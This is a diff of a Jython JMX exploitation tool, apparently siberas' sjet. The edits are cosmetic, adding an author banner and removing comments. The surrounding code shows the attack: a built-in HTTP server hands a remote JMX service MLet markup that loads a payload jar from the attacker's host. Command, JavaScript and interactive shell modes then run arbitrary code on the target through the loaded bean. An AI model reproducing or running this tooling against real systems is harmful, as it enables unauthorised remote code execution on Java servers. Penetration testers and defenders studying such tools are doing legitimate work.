@@ -14,10 +14,11 @@ import sys
 import time
 import jarray
 
+# Extra
 import argparse
-# from cmd import Cmd
 import base64
 
+authorSignature = '[+] sjet was brought to you by siberas :)    '
 
 ### AUX ###
 def connectToJMX(args):
@@ -98,13 +99,9 @@ def MakeHandlerClass(base_url):
         #Handler for the GET requests
         def do_GET(self):
             if self.path=="/":
-                #serve mlet code00000000000000000000000000
-                # see: https://docs.oracle.com/javase/7/docs/api/javax/management/loading/MLet.html
-                #mlet_code = "<mlet code=de.siberas.lab.JMXBean archive=siberas_mlet.jar name=siberas:name=jmx,id=1 codebase=http://192.168.11.138:8888></mlet>"
                 mlet_code = '<html><mlet code="de.siberas.lab.SiberasPayload" archive="siberas_mlet.jar" name="Siberas:name=payload,id=1" codebase="' + self._base_url + '"></mlet></html>'
 
                 self.send_response(200)
-                #self.send_header('Content-type', 'application/octet-stream')
                 self.send_header('Pragma', 'no-cache')
                 self.end_headers()
                 self.wfile.write(mlet_code)
@@ -136,7 +133,6 @@ def commandMode(args):
     print "[+] Done"
 
 def executeCommand(cmd, bean_server):
-    # TODO Prettify this
     # Payload execution
     # Load the Payload Met and invoke a method on it
     mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
@@ -156,8 +152,6 @@ def executeCommand(cmd, bean_server):
     sys.stdout.write("\n")
     sys.stdout.flush()
 
-
-
 ### /COMMAND MODE ###
 
 ### JAVASCRIPT MODE ###
@@ -168,12 +162,10 @@ def scriptMode(args):
     with open(args.filename, 'r') as myfile:
         script=myfile.read().replace('\n', ' ')
 
-    # print script
     executeJS(script, bean_server)
 
 
 def executeJS(js, bean_server):
-    # TODO Prettify this
     # Payload execution
     # Load the Payload Met and invoke a method on it
     mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
@@ -192,7 +184,6 @@ def executeJS(js, bean_server):
 
     sys.stdout.write("\n")
     sys.stdout.flush()
-
 
 ### /JAVASCRIPT MODE ###
 
@@ -213,8 +204,6 @@ def startShell(bean_server):
             in_command_loop = False
         else:
             executeCommand(cmd, bean_server)
-
-
      
 ### /SHELL MODE ###
 
@@ -223,12 +212,16 @@ def startShell(bean_server):
 ### PARSER ###
 # Map for clarity's sake
 def arg_install_mode(args):
+    print authorSignature
     installMode(args)
 def arg_command_mode(args):
+    print authorSignature
     commandMode(args)
 def arg_script_mode(args):
+    print authorSignature
     scriptMode(args)
 def arg_shell_mode(args):
+    print authorSignature
     shellMode(args)
 
 # Base parser
